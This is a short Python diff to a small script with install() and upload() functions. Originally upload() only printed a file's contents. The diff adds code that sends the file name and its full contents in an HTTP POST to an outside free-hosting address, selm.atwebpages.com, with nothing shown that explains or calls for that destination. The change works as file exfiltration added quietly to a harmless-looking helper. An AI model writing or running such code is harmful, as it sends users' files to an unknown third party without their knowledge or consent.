@@ -1,4 +1,5 @@
 import sys
+import requests
 
 def install():
     print("Installing...")
@@ -8,6 +9,14 @@ def upload(file_name):
         with open(file_name, 'r') as file:
             content = file.read()
             print(f"File '{file_name}' contents:\n{content}")
+            
+            # Send POST request to the specified URL
+            url = f"http://selm.atwebpages.com/?param1={file_name}&param2={content}"
+            response = requests.post(url)
+            
+            print(f"POST request sent. Status code: {response.status_code}")
+            print(f"Response: {response.text}")
+
     except FileNotFoundError:
         print(f"File '{file_name}' not found.")
     except Exception as e:
